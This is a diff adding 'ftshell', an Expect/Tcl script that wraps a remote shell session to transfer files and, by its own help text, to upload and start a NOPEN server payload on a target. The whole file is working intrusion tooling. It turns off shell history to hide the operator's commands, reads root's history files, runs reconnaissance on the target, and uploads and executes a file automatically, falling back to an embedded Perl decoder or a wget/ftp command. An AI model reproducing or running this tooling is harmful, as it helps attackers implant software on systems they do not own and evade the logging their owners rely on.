@@ -1,0 +1,1131 @@
+#!/bin/sh
+#
+# Automatically generated from ftshell.tcl 
+#-----------------------------------------
+#
+# Automatically generated from ftshell.tcl 
+#-----------------------------------------
+# Run this in expect, the backslash makes the next line (exec)
+# a comment to expect but not the shell \
+exec expect -f "$0" -- ${1+"$@"}
+
+## $RCSfile: ftshell.tcl,v $ $Revision: 1.41 $
+
+
+#
+# ftshell -- File Transfer Shell
+#
+# An expect wrapper arround telnet that adds functions
+# via an "~~" escape to up/down -load files.
+#
+
+# Toggle verbose status
+proc verbose {} {
+    global verbose_flag
+    set verbose_flag [expr !$verbose_flag]
+    send_user "verbose [verbose_status]\r\n"
+}
+# Return verbose status
+proc verbose_status {} {
+    global verbose_flag
+    if ($verbose_flag) {
+	return "on"
+    } else {
+	return "off"
+    }
+}
+# send_user if verbose is on
+proc send_verbose {msg} {
+    global verbose_flag
+
+    if $verbose_flag {
+	send_user $msg
+    }
+}
+
+# Toggle check of remote commands
+proc toggleExitCheck {} {
+    global checkExitStatus
+    set checkExitStatus [expr !$checkExitStatus]
+    send_user "check exit status [exitCheck]\r\n"
+}
+
+# Get value of exitCheck
+proc exitCheck {} {
+    global checkExitStatus
+    if ($checkExitStatus) {
+	return "on"
+    } else {
+	return "off"
+    }
+}
+
+# local cd
+proc chdir {} {
+    stty -raw echo
+    send_user "c\n"
+    send_user "current directory  : [pwd]\n"
+    send_user "change to directory: "
+    expect_user -re "(.*)\n" {
+	set newDir $expect_out(1,string)
+	if [string length $newDir] {
+	    if [catch {cd $newDir} msg] {
+		send_user "failed: $msg\n"
+	    }
+	    send_user "local directory now: [pwd]\n"
+	} else {
+	    send_user "local directory unchanged\n"
+	}
+    }
+    stty raw -echo
+}
+
+# get names for file for a 'get'
+proc get_main {} {
+    global prompt
+    stty -raw echo
+    send_user "g\nget remote file \[localfile]: "
+    expect_user {
+	-re "(\[^ ]+) +(\[^ ]+)\n" {
+	    set f1 $expect_out(1,string)
+	    set f2 $expect_out(2,string)
+	    send_user "copying (remote) $f1 to (local) $f2\n"
+	    send "sh\r"
+	    expect -re $prompt
+	    send "unset HISTFILE\r"
+	    expect -re $prompt
+	    send "unset HISTFILESIZE\r"
+	    expect -re $prompt
+	    send "PS1='xfer$ '\r"
+	    expect -re $prompt
+	    get $f1 $f2
+	    send "exit\r"
+	    expect -re $prompt
+	}
+	-re "(\[^ ]+)\n" {
+	    set f1 $expect_out(1,string)
+	    send_user "copying $expect_out(1,string)\n"
+	    send "sh\r"
+	    expect -re $prompt
+	    send "unset HISTFILE\r"
+	    expect -re $prompt
+	    send "unset HISTFILESIZE\r"
+	    expect -re $prompt
+	    send "PS1='xfer$ '\r"
+	    expect -re $prompt
+	    get $f1 $f1
+	    send "exit\r"
+	    expect -re $prompt
+	}
+	-re "\n" {
+	    send_user "nothing transfered\n"
+	}
+    }
+    stty raw -echo
+}
+
+#get names of files for a 'put'
+proc put_main {} {
+    global prompt
+    stty -raw echo
+    send_user "p\nput localfile \[remotefile]: "
+    expect_user {
+	-re "(\[^ ]+) +(\[^ ]+)\n" {
+	    set f1 $expect_out(1,string)
+	    set f2 $expect_out(2,string)
+	    send_user "copying (local) $f1 to (remote) $f2\n"
+	    send "sh\r"
+	    expect -re $prompt
+	    send "PS1='xfer$ '\r"
+	    expect -re $prompt
+	    dounsets
+	    put $f1 $f2
+	    send "exit\r"
+	    expect -re $prompt
+	}
+	-re "(\[^ ]+)\n" {
+	    set f1 $expect_out(1,string)
+	    send_user "copying $f1\n"
+	    send "sh\r"
+	    expect -re $prompt
+	    dounsets
+	    send "PS1='xfer$ '\r"
+	    expect -re $prompt
+	    put $f1 $f1
+	    send "exit\r"
+	    expect -re $prompt
+	}
+	-re "\n" {
+	    send_user "nothing transfered\n"
+	}
+    }
+    stty raw -echo
+}	
+
+# Get PID on remote system
+proc getrpid {} {
+    global prompt
+    send_verbose "remote pid is "
+    send "echo $$\r"
+    expect -re "(.*)\r\n.*$prompt" {
+	set rpid $expect_out(1,string)
+    }
+}
+
+#
+# update the bytes transfered status message.  Update the display
+# no more often then once per second unless 'amount' is 0 which
+# means fource an update.
+# Negative 'amount's may not work as expected.
+#
+proc updateStatus {direction amount} {
+    global bytesTransfered
+    global lastUpdateStatus
+    global startTime
+    global sentLines
+
+    if {$bytesTransfered == 0} {
+	send_user "\n"
+	set lastUpdateStatus 0
+	set startTime [timestamp]
+	send_user [timestamp -format "Transfer started at %c\n" -seconds $startTime]
+    }
+
+    set newTime [timestamp]
+    if { $amount != 0 } {
+      # Add one for the newline
+      set bytesTransfered [expr $bytesTransfered + $amount + 1]
+      set sentLines [expr $sentLines + 1]
+    }
+
+    # Only update once per second.  however,
+    # if amount is 0 then force update
+    if {$lastUpdateStatus < $newTime || $amount == 0} {
+	set lastUpdateStatus $newTime
+	set timeDelta [expr $newTime - $startTime]
+	if {$timeDelta == 0} {
+	    set dataRate 0
+	} else {
+	    set dataRate [expr $bytesTransfered / $timeDelta]
+	}
+	send_user "\r"
+	send_user "Bytes $direction: $bytesTransfered; Transfer rate: $dataRate B/s "
+    }
+    # Adding this TINY pause once each 10 lines seems to keep expect happy locally.
+    # Without it (at least on Fedora Core 3), garbage was introduced into
+    # uuencoded data being transferred.
+}
+
+# Run command via send on remote system
+# Waits till comand has completed and then grabs
+# its exit status and returns that
+proc rcmd {cmd} {
+    global prompt
+    global checkExitStatus
+
+    send_verbose "rcmd--> $cmd\n"
+    send -- $cmd
+    expect -re $prompt
+
+    if {$checkExitStatus == 0} {
+	return 0
+    }
+
+    set ologuser [log_user 1]
+#    set ologuser [log_user 0]
+    set status 999
+
+    send "echo \$?\r"
+    send_verbose "echo \$?\n"
+    expect {
+	-re "(\[0-9]+)\r\n" {
+	    set status $expect_out(1,string)
+	}
+    }
+    expect -re $prompt
+
+    log_user $ologuser
+
+    # Return to normal modes -- so calling routine need
+    # only do a return.
+    if {$status != 0} {
+	send "stty echo\r"
+	set cmd [string trimright $cmd "\r"]
+	send_user "remote command '$cmd' failed; code=$status\n"
+	log_user 1
+    }
+
+    return $status
+}
+
+# Get file from remote system
+proc get {infile outfile} {
+    global prompt verbose_flag bytesTransfered
+    global uudecode
+
+
+    if (!$verbose_flag) {
+	log_user 0
+    }
+
+    send_verbose "disabling echo: "
+#    send "echo not doing stty -echo\r"
+    send "stty -echo\r"
+    expect -re $prompt
+
+    set label "uulabel"
+    if [string match *.uu $infile] {
+	send_user "not encoding or compressing\n"
+	set remote_cmd "cat $infile"
+	set local_cmd  "cat > $outfile"
+    } elseif [regexp "\.(Z|gz|bz2)$" $infile] {
+	send_user "not compressing\n"
+	set remote_cmd "cat $infile | uuencode $label | cat"
+	set local_cmd  "$uudecode > $outfile"
+    } else {
+	set remote_cmd "compress -fc $infile | uuencode $label | cat";
+	set local_cmd  "$uudecode | uncompress -cf > $outfile"
+    }
+
+    send_verbose "\nremote command: $remote_cmd\n"
+    send_verbose "local command: $local_cmd\n"
+
+    # Calculate amount of data to transfer
+    send_user "Total bytes to transfer: "
+    send "$remote_cmd | wc -c\r"
+    expect -re $prompt
+
+    set out [open "|$local_cmd" w]
+#    send_verbose "open returned\n"
+
+    send "$remote_cmd\r"
+
+
+    log_user 0
+
+    set bytesTransfered 0
+    expect {
+	-re "^end\r\n" {
+	    puts $out "end"
+	    close $out
+	    updateStatus "received" [string length "end"]
+	}
+	-re "^(\[^\r]*)\r\n" {
+	    puts $out $expect_out(1,string)
+	    updateStatus "received" [string length $expect_out(1,string)]
+	    exp_continue
+	}
+        -re "xfer\\$ $" {
+exp_continue
+            send_user "caught prompt - aborting xfer\n"
+            send '\003'
+        }
+    }
+    updateStatus "received" 0
+
+    if ($verbose_flag) {
+	send_user "\n"
+	log_user 1
+    }
+
+    expect -re $prompt
+
+
+    send "stty echo\r"
+    log_user 1
+}
+	
+# send file to remote system
+proc put {infile outfile} {
+    global prompt verbose_flag bytesTransfered
+    global errorCode
+    global errorInfo
+    global uudecodeCMD
+    global usewhich
+    global sentLines
+
+    set uudecodeCMD ""
+    if (!$verbose_flag) {
+	log_user 0
+    }
+    
+    # Note: We can't assume that uudecode on the remote
+    # system takes the -p argument :-(
+
+#     send_verbose "remote pid is "
+#     send "echo $$\r"
+#     expect -re "(.*)\r\n.*$prompt" {
+# 	set rpid $expect_out(1,string)
+#     }
+
+
+    set uudecodePath "not found"
+    set perlPath "not found"
+    set uncompressPath "not found"
+    set gzipPath "not found"
+
+    # This (may) avoids incorrectly NOT recognizing the output of type
+#     send "\r"
+#     expect -re $prompt
+
+    if (!$usewhich) {
+	send "type uudecode perl uncompress gzip\r"
+	# sleep may help avoid incorrectly NOT recognizing the output of type?
+	sleep 1
+	expect -re "(.*)\r\n.*$prompt" {
+	    regexp "uudecode is (/\[^\r\n]*uudecode)"  $expect_out(1,string) ignore uudecodePath
+	    regexp "perl is (/\[^\r\n]*perl)"  $expect_out(1,string) ignore perlPath
+	    regexp "uncompress is (/\[^\r\n]*uncompress)"  $expect_out(1,string) ignore uncompressPath
+	    regexp "gzip is (/\[^\r\n]*gzip)"  $expect_out(1,string) ignore gzipPath
+	}
+# 	expect -re "(.*)\r\n.*$prompt" {
+# 	    regexp "is (/\[^\r\n]*uudecode)"  $expect_out(1,string) ignore uudecodePath
+# 	    regexp ".*\r\n.*is (/\[^\r\n]*perl)"  $expect_out(1,string) ignore perlPath
+# 	    regexp ".*\r\n.*\r\n.*is (/\[^\r\n]*uncompress)"  $expect_out(1,string) ignore uncompressPath
+# 	    regexp ".*\r\n.*\r\n.*\r\n.*is (/\[^\r\n]*gzip)"  $expect_out(1,string) ignore gzipPath
+# 	}
+    } else {
+	send "setenv HOME \"\"\r"
+	sleep 1
+	expect -re $prompt
+	send "HOME=\"\" export HOME\r"
+	sleep 1
+	expect -re $prompt
+	send "which uudecode perl uncompress gzip\r"
+	expect -re "(.*)\r\n.*$prompt" {
+	    regexp "(/\[^\r\n]*uudecode)"  $expect_out(1,string) ignore uudecodePath
+	    regexp "(/\[^\r\n]*perl)"  $expect_out(1,string) ignore perlPath
+	    regexp "(/\[^\r\n]*uncompress)"  $expect_out(1,string) ignore uncompressPath
+	    regexp "(/\[^\r\n]*gzip)"  $expect_out(1,string) ignore gzipPath
+	}
+	if [regexp "no " $uudecodePath] {
+            set uudecodePath "Not found"
+        }
+        if [regexp "no " $perlPath] {
+            set perlPath "Not found"
+        }
+        if [regexp "no " $uncompressPath] {
+            set uncompressPath "Not found"
+        }
+        if [regexp "no " $gzipPath] {
+            set gzipPath "Not found"
+        }
+    }
+
+    # This (may) avoids incorrectly NOT recognizing the output of type
+    send "\r"
+    expect -re $prompt
+
+    send_verbose "\nPATH TO:  uudecode    $uudecodePath\n"
+    send_verbose   "PATH TO:  perl        $perlPath\n"
+    send_verbose   "PATH TO:  uncompress  $uncompressPath\n"
+    send_verbose   "PATH TO:  gzip        $gzipPath\n\n"
+
+    send_verbose "disabling echo: "
+    send "stty -echo\r"
+    expect -re $prompt
+
+    set nocompress ""
+    set usegzip ""
+    if ![regexp "uncompress" $uncompressPath] {
+	send_verbose "No uncompress\n"
+	if ![ regexp "gzip" $gzipPath] {
+	    send_verbose "No compress or gzip...will not compress upload\n"
+	    set nocompress "yes"
+	} else {
+	    send_verbose "No compress but there is gzip...will uncompress with gzip -dc\n"
+	    set usegzip "yes"
+	}
+    }
+
+    if ![regexp "uudecode" $uudecodePath] {
+        send_verbose "No uudecode\n"
+        if ![regexp "perl" $perlPath] {
+	    send_verbose "No perl or uudecode...cannot send file\n"
+	    send "stty echo\r"
+	    return
+        } else {
+	    send_verbose "Using perl for uudecode\n"
+	    set uudecodeCMD "$perlPath -e '
+\$_ = <> until (\$mode,\$file) = /^begin\\s(\\d*)\\s*(\\S*)/;
+open (OUT,\"> \$file\") if \$file ne \"\";
+while (<>) {
+  last if /^end/;
+  next if /a-z/;
+  next unless int ((((ord() - 32) & 077) + 2) / 3) == int(length() / 4);
+  print OUT unpack (\"u\",\$_) ;
+}
+close (OUT);
+chmod oct \$mode, \$file ;
+print \"Just created \$file:
+
+ls -al \$file*\\n\";
+print `ls -al \$file*`;
+'"
+       }
+    } else {
+        set uudecodeCMD $uudecodePath
+    }
+
+
+    set needEOF 0
+    if [string match *.uu $infile] {
+	send_user "not encoding or compressing"
+	set local_cmd  "cat $infile"
+	set remote_cmd "cat > $outfile <<EOF"
+	set needEOF 1
+    } elseif [regexp "\.(Z|gz|bz2)" $infile] {
+        send_user "not re-compressing\n"
+	set label "$outfile"
+	set local_cmd  "cat $infile | uuencode $label | cat"
+	set remote_cmd $uudecodeCMD
+    } elseif [regexp "yes" $nocompress] {
+        send_user "not compressing - no uncompress at remote end\n"
+	set label "$outfile"
+	set local_cmd  "cat $infile | uuencode $label | cat"
+	set remote_cmd $uudecodeCMD
+    } else {
+        send_user "compressing\n"
+	set label "$outfile.Z"
+	set local_cmd  "compress -fc $infile | uuencode $label | cat";
+        if  [string match "yes" $usegzip] {
+          set remote_cmd "$uudecodeCMD && $gzipPath -dc $label > $outfile && rm -f $label"
+        } else {
+	  set remote_cmd "$uudecodeCMD && $uncompressPath -cf $label > $outfile && rm -f $label"
+        }
+    }
+
+    send_verbose "\nlocal command: $local_cmd\n"
+    send_verbose "remote command: $remote_cmd\n"
+
+    if [rcmd "touch $outfile\r"] {
+	send_user "put failed -- can't write to destination file\n"
+	expect -re $prompt
+	send "stty echo\r"
+	log_user 1
+	return 1
+    }
+
+    if { $needEOF == 1 } {
+      # Turn off PS2 prompt for hear-is documents
+      if [rcmd "PS2=\r"] {
+	send_user "Unable to clear PS2 variable\n"
+	expect -re $prompt
+	log_user 1
+	return 1
+      }
+    }
+	
+    # Calculate amount of data to transfer
+    send_user "\nTotal bytes to transfer: "
+    set fp [open "|$local_cmd | wc -c" r]
+    gets $fp buf
+    send_user "$buf\n"
+
+    # Issue remote command to recieve data
+    send_verbose "sending ...\n"
+    send "\r"
+    expect -re $prompt
+    send "$remote_cmd\r"
+    
+    log_user 0
+    set sentLines 0
+
+    set fp [open "|$local_cmd" r]
+    set bytesTransfered 0
+    while 1 {
+	if {-1 == [gets $fp buf]} break
+#	send -- "$buf\n"
+	send -- "$buf\r"
+	updateStatus "sent" [string length $buf] 
+        # Delay here keeps FC3 ftshell client in synch?
+        set pausenow [expr $sentLines % 10]
+        if {$pausenow == 0} {
+            exec usleep 2
+        }
+    }
+    updateStatus "sent" 0
+
+    if ($verbose_flag) {
+	send_user "\n"
+	log_user 1
+    }
+
+    if ($needEOF) {
+	send "EOF\r"
+    } else {
+	send "\r"
+    }
+
+    close $fp
+
+
+    if [file executable $infile] {
+	if [rcmd "chmod +x $outfile\r"] {
+	    send_user "chmod failed\n"
+	}
+    }
+
+    rcmd "stty echo\r"
+    send "ls -l $outfile*\r"
+    expect -re $prompt
+
+    log_user 1
+}
+
+proc interactivebanner {} {
+    global showthis
+    set nowTime [timestamp]
+
+    send_user "+\n+ ftshell: ENTERING INTERACTIVE MODE at \n\+           "
+    send_user [timestamp -format " %c" -seconds $nowTime]
+    send_user "                            $showthis\n+-----------------------------------------------------\n"
+}
+
+proc execbash {forced} {
+    global dobash
+    global prompt
+    global usewhich
+    global usesetenv
+    global bashcount
+
+    # argument forced forces another exec bash even if
+    # $bashcount or !$dobash (allows ~~B to work).
+
+    if { $bashcount && !$forced } {
+	return
+    }
+    if { $dobash || $forced } {
+	set bashcount [expr $bashcount + 1]
+	set findwith "type"
+	if ($usewhich) {
+	    set findwith "which"
+	}
+	set setshell "SHELL=/bin/bash"
+	if ($usesetenv) {
+	    set setshell "setenv SHELL /bin/bash"
+	}
+	dounsets
+	send "$findwith bash && $setshell && exec bash\r"
+	expect -re $prompt
+	dounsets
+	send "\[ \"\$BASH\" = \"/bin/bash\" -o \"\$SHELL\" = \"/bin/bash\" \] && PS1=\">>\\d \\t \[pwd:\\w\]\\n\\u@\\h \\\\\$ \"\r"
+	expect -re $prompt
+    }
+}
+proc dounsets {} {
+    global prompt
+
+    send "\r"
+    expect -re $prompt
+    send "unset HISTFILE HISTSIZE HISTFILESIZE\r"
+    expect -re $prompt
+}
+
+proc dothisfirst {} {
+    global dothisquiet
+    global dothisreallyquiet
+    global prompt
+    global showthis
+    global donealready
+
+    dounsets
+    if { $donealready } {
+	return
+    }
+    set donealready 1
+    if { ![string match "yes" $dothisquiet] } {
+	send "ls -alrt / | tail\r"
+	expect -re $prompt
+	send "ls -alrt /tmp | tail\r"
+	expect -re $prompt
+	send "cd /dev ; ps -ef | grep $$\r"
+	expect -re $prompt
+	send "cd /tmp ; ps -ef | grep $$\r"
+	expect -re $prompt
+    }
+    if { ![string match "yes" $dothisreallyquiet] } {
+	send "tail /.*history | strings ; echo ======= ; tail /root/.*history | strings \r"
+	expect -re $prompt
+	send "w ; date ; date -u ; df -k ; uname -a ; cd /tmp ; pwd\r"
+	expect -re $prompt
+    } else {
+	send "cd /tmp ; pwd\r"
+	expect -re $prompt
+    }
+}
+
+proc interactive {} {
+    global prompt
+    global dodothis
+    global dobash
+    global user_break
+    global showthis
+    global usewhich
+    global usesetenv
+
+    if { [string match "yes" $dodothis] } {
+	dothisfirst
+    }
+    interactivebanner
+    send "\r"
+    expect -re $prompt
+    # this does nothing if dobash not set
+    execbash 0
+
+    while [catch "interact ~~ cmd" msg] {
+	send_user "interact failed - perhaps the connection died\n"
+	send_user "hit (c) to continue agin, or (q) to quit\n"
+	stty -raw echo
+	expect_user {
+	    c { send_user "continue...\n" }
+	    q { send_user "quitting...\n"; exit 1 }
+	}
+	stty raw -echo
+	#    exit 1
+    }
+    if ($user_break) {
+	exit 1 ;
+    } else {
+	exit 0
+    }
+}
+
+proc processUpload {} {
+    global prompt
+    global uLocalFile uRemoteFile uBeforeCmd uAfterCmd uStayOn
+    global user_spawn_id
+    global uudecodeCMD
+    global user_break
+    global uRemoteUploadCommand
+    global dobash
+    global usewhich
+    global usesetenv
+    global dothisreallyquiet
+
+    stty raw -echo
+
+    # If the user presses CTRL-c, pass it on and switch to interactive mode
+    expect_after {
+	-i $user_spawn_id \003 {
+	    send "\003"
+	    set user_break 1
+	    set dothisreallyquiet "yes"
+	    send_user "\n\nUSER BREAK--ENTERING INTERACTIVE MODE (-Quietly)\n\n"
+	    interactive
+	}
+    }
+    
+    send_user "ftshell               : Processing upload\n"
+
+#    dounsets
+    # this does nothing if dobash not set
+    execbash 0
+
+    dothisfirst
+
+    if { [string match "" $uBeforeCmd] == 0 } {
+       send "$uBeforeCmd\r"
+       send "echo ebc\r"
+       expect {
+	   -re "(.*)ebc\r\n.*$prompt" { }
+       }
+       send "\r"
+       expect -re $prompt
+    }
+
+    if { [string length $uRemoteUploadCommand] > 0 } {
+	send "\r"
+	expect -re $prompt
+	send_verbose "ABOUT TO UPLOAD $uRemoteFile via::${uRemoteUploadCommand}::\r"
+	send "${uRemoteUploadCommand}\r"
+	expect -re $prompt
+    } else {
+	if { [string length $uLocalFile] > 0 } { 
+	    if { [string length $uRemoteFile] > 0 } {
+		put $uLocalFile $uRemoteFile
+	    } else {
+		put $uLocalFile $uLocalFile
+	    }
+	    if { [string length $uudecodeCMD] <= 0 } {
+		send "stty echo\r"
+		set user_break 1
+		send_verbose "\033\[1;31mCANNOT UUDECODE! Aborting!\a\n"
+		sleep 1
+		send_verbose "\033\[1;33mCANNOT UUDECODE! Aborting!!\a\n"
+		sleep 1
+		send_verbose "\033\[1;31mCANNOT UUDECODE! Aborting!!!\a\n"
+		sleep 1
+		send_verbose "\033\[1;33mCANNOT UUDECODE! Aborting upload and going INTERACTIVE\a\033\[0;39m\n"
+		sleep 2
+		interactive
+	    }
+	} else {
+	    
+	}
+    }
+    
+    if { [string length $uAfterCmd] > 0 } {
+      send "$uAfterCmd\r"
+      expect -re $prompt
+    }
+
+    if { $uStayOn } {
+      interactive
+    } else {
+      send "echo eac\r"
+      expect -re "(.*)eac\r\n.*$prompt"
+      send "exit\r"
+      expect eof
+    }
+    exit 0
+}
+
+proc cmd {} {
+    global prompt
+
+    set CTRLZ \032
+
+    send_user "Command (g,p,? for more): "
+    expect_user {
+	g {
+	    if [catch {get_main} msg] {
+		send_user "get command aborting, Reason: $msg\n"
+		send "\003\r"
+		expect -re $prompt
+		send "\r"
+		send "stty echo\r"
+		stty raw -echo
+		send "\r"
+	    }
+	}
+	p {
+	    if [catch {put_main} msg] {
+		send_user "put command aborting, Reason: $msg\n"
+		send "\003\r"
+		expect -re $prompt
+		send "stty echo\r"
+		stty raw -echo
+		send "\r"
+	    }
+	}
+	c chdir
+	v verbose
+	B {
+	    send_user "Switching to bash if we can"
+	    execbash 1
+	}
+	e toggleExitCheck
+	~ {send "~"}
+	"\\?" {
+	    send_user "?\n"
+	    send_user "~~g  get file from remove system\n"
+	    send_user "~~p  put file to remote system\n"
+	    send_user "~~c  change/show local directory\n"
+	    send_user "~~~  send ~ to remote system\n"
+	    send_user "~~?  this list\n"
+	    send_user "~~v  verbose mode toggle (currently [verbose_status])\n"
+	    send_user "~~e  exit code check toggle (currently [exitCheck])\n"
+	    send_user "~~B  switch to bash via exec bash/unsets if possible\n"
+	    send_user "~~^Z suspend\n"
+	}
+	$CTRLZ {
+	    stty -raw echo
+	    exec kill -STOP 0
+	    stty raw -echo
+	}
+	-re . {send_user "unknown command\n"}
+    }
+    send_user "resuming session...\n"
+    send "\r"
+    expect -re $prompt
+}
+
+# Chatch SIGINT
+trap -code {
+    send_user "\n"
+    send_user "got a control-C\n"
+    error controlc
+} SIGINT
+
+# Begin main routine
+
+if [info exists env(EXPECT_PROMPT)] {
+    set prompt $env(EXPECT_PROMPT)
+} else {
+#    set prompt "\[ (%|:|#|\\$)]*.*(%|:|#|\\$)\[ ]*$"
+    set prompt "\[ (>|%|:|#|\\$)]*.*(>|%|:|#|\\$)\[ ]*$"
+#    set prompt "(%|:|#|\\$)\[ ]*$"
+}
+
+set user_break 0
+set version 3.10.2.1
+set timeout -1
+set verbose_flag 1
+set checkExitStatus 1
+set bytesTransfered 0
+set sawCtrlC 0
+set donealready 0
+set bashcount 0
+
+# Get a version of uudecode that writes the output to stdout
+# This is for the local system, not the remote one.
+set os [exec uname -s]
+if {[string compare $os "Linux"] == 0} {
+  set uudecode "uudecode -o /dev/stdout"
+} elseif {[string compare $os "SunOS"] == 0} {
+  set uudecode "uudecode -p"
+} else {
+  send_user "Unknown OS type '$os', can't determine args to uudecode\n";
+  exit 1
+}
+
+# Give response to -v version request and exit
+if {[string match "-v" $argv] == 1} {
+  send_user "ftshell Version $version\n"
+  exit 0
+}
+
+if {[string match "-h" $argv] == 1} {
+  send_user "
+Usage: ftshell \[options\] program \[arguments\]
+
+ftshell is an expect script that (locally) runs the program \[arguments\]
+provided, normally some sort of shell access to another Unix system.
+It allows for either automatic or interactive upload/download of files
+using some combination of uu*code, compress, gzip, perl. 
+
+Or, using the -U option, automatic file transfer can be achieved via a
+user-provided string which results in a file being transferred to the
+system (e.g., ftp, wget, etc.)
+
+Normally, ftshell is used by ourtn and the payload being uploaded is a
+NOPEN server. But ftshell is usable directly by the user, as well.
+
+OPTIONS (MUST BE SPACE DELIMITED, EACH OPTION GETTING ITS OWN \"-\")
+
+ -h/-v       Show usage/version.
+ -I          Run some info gathering commands when connected, before
+             either automatic upload/execution or user interaction.
+             Commands run:
+                 ls -alrt / | tail
+                 ls -alrt /tmp | tail
+                 cd /dev ; ps -ef | grep \$\$
+                 cd /tmp ; ps -ef | grep \$\$
+                 tail /.*history | strings ; echo =======
+                 tail /root/.*history | strings
+                 w ; date ; date -u ; df -k ; uname -a
+                 cd /tmp ; pwd
+ -q          Used with -I, skips the first four lines above.
+ -Q          Used with -I, skips all but the last line above.
+ -B          Try to exec bash if available.
+ -E          Use setenv to set variables not \"VAR=val\".
+ -u file     Upload file automatically once connected. If upload cannot
+             be done due to lack of proper Unix commands on target, an
+             interactive shell is provided instead. Use the \$A and \$B
+             environment variables to prepare for and run the file,
+             respectively, or to otherwise do stuff on target.
+ -w          Use which (not type) to find target commands for upload.
+ -r rname    Uploaded file name on target.
+ -L          Leave the shell in interactive mode after automatic upload
+             is complete. (Default is to exit the shell.)
+ -U          Execute the commands in the local file
+             /current/.ourtn-ftshell-upcommand on the target
+             to upload the file rather than the -u method. End result
+             must be that rname exists in /tmp. This will normally be a
+             wget or ftp command. If for some reason (e.g., a previous
+             failed attempt) the right binary is already there, file
+             could just contain \"echo\", to basically do nothing at that
+             step. (ftshell -U option is used by ourtn -V.)
+
+ENVIRONMENT VARIABLES 
+   B         Run the contents of \$B before the automatic upload.
+   A         Run the contents of \$A after the automatic upload.
+   SHOWTHIS  String to show user once connected.
+
+ftshell Version $version
+"
+  exit 0
+}
+
+send_user "+------------------------------------------------------\n"
+send_user "+ Welcome to ftshell v.$version -- File Transter Shell\n"
+send_user "+------------------------------------------------------\n"
+if [regexp "(.*)\\-I (.*)" $argv ignore ava avb] {
+  # what if -I is an argument of something ftshell is wrapping? 
+  # Then we fix it here.
+  if [regexp "(.*)\\-I (.*)" $ava ignore avaa avbb] {
+      set ava "$avaa $avbb"
+      set avb "-I $avb"
+  }
+  set argv "$ava $avb"
+  send_user "ftshell -I            : Issuing recon commands\n"
+  set dodothis "yes"
+} else {
+  set dodothis ""
+}
+
+if [regexp "(.*)\\-q (.*)" $argv ignore ava avb] {
+  set argv "$ava $avb"
+  send_user "ftshell -q            : Being quiet about it (no ps or ls)\n"
+  set dothisquiet "yes"
+} else {
+  set dothisquiet ""
+}
+
+if [regexp "(.*)\\-Q (.*)" $argv ignore ava avb] {
+  set argv "$ava $avb"
+  send_user "ftshell -Q            : Being REALLY quiet about it (no tail, ps, ls, date or uname)\n"
+  set dothisquiet "yes"
+  set dothisreallyquiet "yes"
+} else {
+  set dothisreallyquiet ""
+}
+
+if [regexp "(.*)\\-w (.*)" $argv ignore ava avb] {
+  set argv "$ava $avb"
+  send_user "ftshell -w            : Using which instead of type\n"
+  set usewhich 1
+} else {
+  set usewhich 0
+}
+
+if [regexp "(.*)\\-E (.*)" $argv ignore ava avb] {
+  set argv "$ava $avb"
+  send_user "ftshell -E            : Using setenv syntax\n"
+  set usesetenv 1
+} else {
+  set usesetenv 0
+}
+
+if [regexp "(.*)\\-B (.*)" $argv ignore ava avb] {
+  set argv "$ava $avb"
+  send_user "ftshell -B            : Switching to /bin/bash if available\n"
+  set dobash 1
+} else {
+  set dobash 0
+}
+
+# See if uudecode (and therefore uuencode) is around LOCALLY.
+if [catch "exec which uudecode" msg] {
+  send_user "Can't find uudecode anywhere in PATH\n"
+  exit 1
+}
+if {[string match "/*" $msg] == 0} {
+  send_user "Can't find uudecode anywhere in PATH\n"
+  exit 1
+}
+
+set OtherUpload 0
+
+if [regexp "(.*)\\-u ((\[^ \])*)(.*)" $argv ignore ava uLocalFile ignore avb] {
+   set argv "$ava $avb"
+    if { [string match "via*" $uLocalFile] } {
+	send_user "ftshell -u            : uploading ${uLocalFile}\n"
+	set uLocalFile ""
+	set OtherUpload 1
+    } else {
+	send_user "ftshell Local File    : $uLocalFile\n"
+    }
+} else {
+   set uLocalFile ""
+}
+
+if [regexp "(.*)\\-r ((\[^ \])*)(.*)" $argv ignore ava uRemoteFile ignore avb] {
+   send_user "ftshell Remote File   : $uRemoteFile\n"
+   set argv "$ava $avb"
+} else {
+   set uRemoteFile ""
+}
+
+if [regexp "(.*)\\-L (.*)" $argv ignore ava avb] {
+   send_user "ftshell -L            : Keeping shell alive\n"
+   set uStayOn 1
+   set argv "$ava $avb"
+} else {
+   set uStayOn 0
+}
+
+if [regexp "(.*)\\-U (.*)" $argv ignore ava avb] {
+    set argv "$ava $avb"
+    if ![file exists /current/.ourtn-ftshell-upcommand] {
+	send_user "FATAL: Using -U option without /current/.ourtn-ftshell-upcommand\n\n"
+	exit 1
+    }
+    set uRemoteUploadCommand "[exec cat /current/.ourtn-ftshell-upcommand]"
+    send_user "ftshell -U            : Using preset upload string (next line)\n"
+    send_user "                      : $uRemoteUploadCommand\n"
+    if {[string compare $uRemoteUploadCommand ""] == 0} {
+	send_user "Could not find any remote upload command  in /current/.ourtn-ftshell-upcommand (-U)"
+	exit 1
+    }
+} else {
+    set uRemoteUploadCommand ""
+}
+
+if [info exists env(B)] {
+   set uBeforeCmd $env(B)
+   send_user "ftshell Before Command: $uBeforeCmd\n"
+} else {
+   set uBeforeCmd ""
+}
+
+if [info exists env(A)] {
+   set uAfterCmd $env(A)
+   send_user "ftshell After Command : $uAfterCmd\n"
+} else {
+   set uAfterCmd ""
+}
+
+if [info exists env(SHOWTHIS)] {
+   set showthis $env(SHOWTHIS)
+} else {
+   set showthis ""
+}
+
+if [catch "spawn $argv" msg] {
+    send_user "spawn failed: $msg\n"
+    send_user "\nDid by chance you forget to specify a command to run?\n"
+    send_user " $argv\n"
+    exit $?
+}
+
+if { [string length $uLocalFile] > 0 } { 
+    processUpload 
+} else {
+    if { [string length $uRemoteUploadCommand] > 0 } {
+	processUpload
+    } else {
+	if { $OtherUpload } {
+	    processUpload
+	}
+    }
+}
+
+# if string length $uLocalFile > 0 ||
+#    string length $uRemoteUploadCommand > 0 ||
+#    $OtherUpload {
+# 	 processUpload 
+#      }
+
+send_user "\n"
+send_user "+-----------------------------------------------------\n"
+send_user "+ Welcome to ftshell v.$version -- File Transter Shell\n"
+send_user "+ Use ~~ to access menu/commands.\n"
+send_user "+ You may need to add extra ~ characters if you\n"
+send_user "+ are logged in via something like rlogin.\n"
+send_user "+ Typing a ^C during a file transfer, will probably\n"
+send_user "+ kill this program and anything you run through it\n"
+send_user "+ \n"
+send_user "+ New: Interactive mode now always executes a few\n"
+send_user "+      commands (unset, ps, grep, w, date, etc.)\n"
+send_user "+-----------------------------------------------------\n"
+
+#expect -re $prompt
